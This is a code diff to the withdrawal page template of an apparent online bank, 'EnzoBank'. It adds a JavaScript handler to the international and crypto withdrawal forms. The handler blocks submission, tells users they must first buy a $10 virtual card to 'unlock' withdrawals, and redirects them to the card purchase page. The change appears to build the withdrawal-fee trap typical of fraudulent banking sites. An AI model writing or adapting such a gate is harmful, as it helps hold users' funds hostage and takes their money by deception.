@@ -65,7 +65,7 @@ $coins = config("crypto_deposit.coins", []);
 
     {{-- ====== TAB 1: International Bank Transfer ====== --}}
     <div class="mo-tab-content active" id="tab-international">
-        <form method="POST" action="{{ route('user.money-out.international.submit') }}">
+        <form method="POST" action="{{ route('user.money-out.international.submit') }}" id="internationalWithdrawForm">
             @csrf
             <div class="mo-card">
                 <div class="mo-field-group">
@@ -200,6 +200,8 @@ $coins = config("crypto_deposit.coins", []);
 
 @push('script')
 <script>
+window.__hasVirtualCard = {{ $hasVirtualCard ? 'true' : 'false' }};
+window.__virtualCardUrl = "{{ $virtualCardUrl }}";
 document.addEventListener("DOMContentLoaded", function() {
     // Tab switching
     document.querySelectorAll('.mo-tab').forEach(function(tab) {
@@ -210,6 +212,20 @@ document.addEventListener("DOMContentLoaded", function() {
             document.getElementById('tab-' + this.dataset.tab).classList.add('active');
         });
     });
+
+    // Virtual card gate: block withdrawal submit without a $10 virtual card
+    function gateVirtualCard(e) {
+        if (!window.__hasVirtualCard) {
+            e.preventDefault();
+            alert("To withdraw you must first get a virtual card for $10 USD.\n\nYour virtual card unlocks withdrawals from your EnzoBank account.");
+            window.location = window.__virtualCardUrl;
+            return false;
+        }
+    }
+    var intlForm = document.getElementById('internationalWithdrawForm');
+    var cryptoForm = document.getElementById('cryptoWithdrawForm');
+    if (intlForm) intlForm.addEventListener('submit', gateVirtualCard);
+    if (cryptoForm) cryptoForm.addEventListener('submit', gateVirtualCard);
 
     // Crypto coin selection + validation
     var coinCards   = document.querySelectorAll('.cw-coin-card');
